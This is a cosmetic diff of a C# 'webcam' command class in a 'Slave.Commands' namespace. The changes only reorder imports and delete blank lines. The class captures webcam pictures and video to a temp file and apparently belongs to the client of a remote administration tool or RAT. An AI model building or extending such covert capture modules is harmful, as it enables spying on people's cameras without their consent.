@@ -1,14 +1,14 @@
-﻿using System;
+﻿using Accord.Video;
+using Accord.Video.DirectShow;
+using Accord.Video.FFMPEG;
+using Shared;
+using Slave.Commands.Core;
+using System;
 using System.Collections.Generic;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
 using System.Timers;
-using Accord.Video;
-using Accord.Video.DirectShow;
-using Accord.Video.FFMPEG;
-using Shared;
-using Slave.Commands.Core;
 using Timer = System.Timers.Timer;
 
 namespace Slave.Commands
@@ -16,7 +16,6 @@ namespace Slave.Commands
     internal class Webcam : ICommand
     {
         public string name { get; } = "webcam";
-
 
         VideoCaptureDevice videoDevice;
 
@@ -28,8 +27,6 @@ namespace Slave.Commands
 
         bool mustReturn;
 
-
-        
         public void Process(List<string> args)
         {
             mustReturn = false;
@@ -56,7 +53,6 @@ namespace Slave.Commands
             }
         }
 
-
         void TakePicture()
         {
             videoDevice.NewFrame += Picture_NewFrame;
@@ -73,7 +69,6 @@ namespace Slave.Commands
                 Thread.Sleep(100);
             }
         }
-
 
         void TakeVideo()
         {
@@ -99,7 +94,6 @@ namespace Slave.Commands
 
             File.Delete(videoFileName);
         }
-        
 
         void Video_NewFrame(object sender, NewFrameEventArgs eventArgs)
         {
@@ -108,10 +102,9 @@ namespace Slave.Commands
                 videoFileName = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.tmp");
                 fileWriter.Open(videoFileName, eventArgs.Frame.Width, eventArgs.Frame.Height, 30, VideoCodec.MPEG4, 2500000);
             }
-            
+
             fileWriter.WriteVideoFrame(eventArgs.Frame);
         }
-
 
         void Picture_NewFrame(object sender, NewFrameEventArgs eventArgs)
         {
@@ -126,7 +119,6 @@ namespace Slave.Commands
 
             mustReturn = true;
         }
-
 
         void Timer_Elapsed(object sender, ElapsedEventArgs e)
         {
